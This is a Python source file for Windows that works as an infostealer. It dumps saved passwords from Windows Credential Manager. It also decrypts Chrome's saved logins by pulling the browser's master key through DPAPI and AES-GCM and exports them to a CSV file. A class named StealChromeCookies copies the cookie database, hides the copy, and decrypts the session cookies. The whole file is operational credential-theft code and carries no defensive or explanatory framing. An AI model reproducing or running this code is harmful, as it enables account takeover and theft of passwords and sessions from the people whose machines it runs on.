import os, io, sys, sqlite3, json, shutil, win32cred, win32crypt, win32con, pywintypes

import re

import csv

import base64

from Cryptodome.Cipher import AES

import win32api

CRED_TYPE_GENERIC = win32cred.CRED_TYPE_GENERIC

class credentials:

    def dump_credsman_generic(self):

        self.CredEnumerate = win32cred.CredEnumerate
        self.CredRead = win32cred.CredRead

        try:
            creds = self.CredEnumerate(None, 0)

        except Exception:
            pass

        credentials = []

        for package in creds:
            try:
                target = package['TargetName']
                creds = self.CredRead(target, CRED_TYPE_GENERIC)
                credentials.append(creds)

            except pywintypes.error:
                pass

        credman_creds = io.StringIO()

        for cred in credentials:
            service = cred['TargetName']
            username = cred['UserName']
            password = cred['CredentialBlob']

            credman_creds.write('Service: ' + str(service) + '\n')
            credman_creds.write('Username: ' + str(username) + '\n')
            credman_creds.write('Password: ' + str(password) + '\n')
            credman_creds.write('\n')

        return credman_creds.getvalue()




class ChromePassword:
    def __init__(self):
        self.CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
        self.CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

    def test(self):
        print(self.CHROME_PATH)
        print(self.CHROME_PATH_LOCAL_STATE)
        print(os.listdir(self.CHROME_PATH_LOCAL_STATE))


    def get_secret_key(self):
        try:
            with open(self.CHROME_PATH_LOCAL_STATE, "r", encoding="utf-8") as f:
                local_state = f.read()
                local_state = json.loads(local_state)

            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

            secret_key = secret_key[5: ]
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]

            return secret_key

        except Exception as e:
            print(e)
            print("[ERR] Chrome secretkey cannot be found")
            return None

    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(self, ciphertext, secret_key):
        try:
            initialisation_vector = ciphertext[3:15]
            encrypted_password = ciphertext[15:-16]

            cipher = self.generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = self.decrypt_payload(cipher, encrypted_password)
            decrypted_pass = decrypted_pass.decode()
            return decrypted_pass

        except Exception as e:
            print(e)
            print("Chrome version <80 not supported")

        return None

    def get_db_connection(self, chrome_path_login_db):
        try:
            print(chrome_path_login_db)
            shutil.copy2(chrome_path_login_db, "loginvault.db")
            return sqlite3.connect("loginvault.db")

        except Exception as e:
            print(e)

            print("Database cannot be found")

            return None





    def ChromeSniff(self):
        try:
            with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
                csv_writer = csv.writer(decrypt_password_file, delimiter=',')
                csv_writer.writerow(["index", "url", "username", "password"])
                # (1) Get secret key
                secret_key = self.get_secret_key()
                # Search user profile or default folder (this is where the encrypted login password is stored)
                folders = [element for element in os.listdir(self.CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
                for folder in folders:
                    # (2) ciphertext from sqlite database
                    chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (self.CHROME_PATH, folder))
                    conn = self.get_db_connection(chrome_path_login_db)
                    if (secret_key and conn):
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        for index, login in enumerate(cursor.fetchall()):
                            url = login[0]
                            username = login[1]
                            ciphertext = login[2]
                            if (url != "" and username != ""  and ciphertext != ""):
                                # (3) Filter the initialisation vector & encrypted password from ciphertext
                                # (4) Use AES algorithm to decrypt the password
                                decrypted_password = self.decrypt_password(ciphertext, secret_key)
                                print("Sequence: %d" % (index))
                                print("URL: %s\nUser Name: %s\nPassword: %s\n" % (url, username, decrypted_password))
                                print("*" * 50)
                                # (5) Save into CSV
                                csv_writer.writerow([index, url, username, decrypted_password])
                                print(index, url, username, decrypted_password)
                        # Close database connection
                        cursor.close()
                        conn.close()
                        # Delete temp login db
                        os.remove("Loginvault.db")
        except Exception as e:
            print("[ERR] " % str(e))





class ChromeCookies:
    def StealChromeCookies(self):
        login_data = os.environ['localappdata'] + '\\Google\\Chrome\\User Data\\Default\\Cookies'
        shutil.copy2(login_data, './Cookies')
        win32api.SetFileAttributes('./Cookies', win32con.FILE_ATTRIBUTE_HIDDEN)

        try:
            conn = sqlite3.connect('./Cookies')
            cursor = conn.cursor()

            cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
            results = cursor.fetchall()


            for host_key, name, value, encrypted_value in results:
                decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()

                cursor.execute("UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999,\is_persistent = 1, is_secure = 0 WHERE host_key = ? AND name = ?", (decrypted_value, host_key, name));

                conn.commit()
                conn.close()

        except Exception as e:
            print(e)
            pass

